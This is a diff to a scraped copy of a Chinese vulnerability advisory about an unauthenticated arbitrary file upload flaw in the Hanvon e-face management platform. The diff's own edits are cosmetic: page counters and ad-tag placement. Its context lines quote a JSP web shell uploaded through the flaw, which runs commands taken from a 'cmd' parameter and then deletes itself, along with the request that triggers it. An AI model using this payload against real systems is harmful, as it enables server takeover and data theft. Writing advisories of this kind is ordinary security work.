@@ -7,17 +7,17 @@ asset_dir: assets/汉王e脸通综合管理平台-meetingpersonaluploadmeetingfi
 # 汉王e脸通综合管理平台 meetingPersonal/uploadMeetingFile.do 任意文件上传漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/7/15 08:35
-- 786浏览
+- 787浏览
 - [0评论](#comment)
 - 31分钟阅读
 
 深入探索
 
-应用程序
-
-服务器
+SQL
 
 application
+
+应用程序
 
 ---
 
@@ -25,7 +25,7 @@ application
 
 汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `meetingPersonal/uploadMeetingFile.do` 接口存在任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。攻击者可在无需认证的情况下，通过向该接口上传恶意文件，实现任意文件上传，进而可能导致[远程代码执行](https://mrxn.net/tag/rce)或服务器被控制，严重威胁系统安全。
 
-漏洞预警服务
+漏洞修复方案
 
 # 影响版本
 
@@ -79,6 +79,14 @@ V1.6.x
       }
 ```
 
+深入探索
+
+云安全解决方案
+
+文本剥离工具
+
+编码转换工具
+
 直接保存文件到 `resource` 目录，全程无过滤和校验，造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。
 
 # 漏洞复现
@@ -95,14 +103,6 @@ Content-Type: image/jpeg
 <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
 ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
 ```
-
-深入探索
-
-Docker加速服务
-
-技术文章订阅
-
-网络安全会议
 
 访问文件执行命令 `/manage/resource/xxxxx.jsp?cmd=whoami`
 
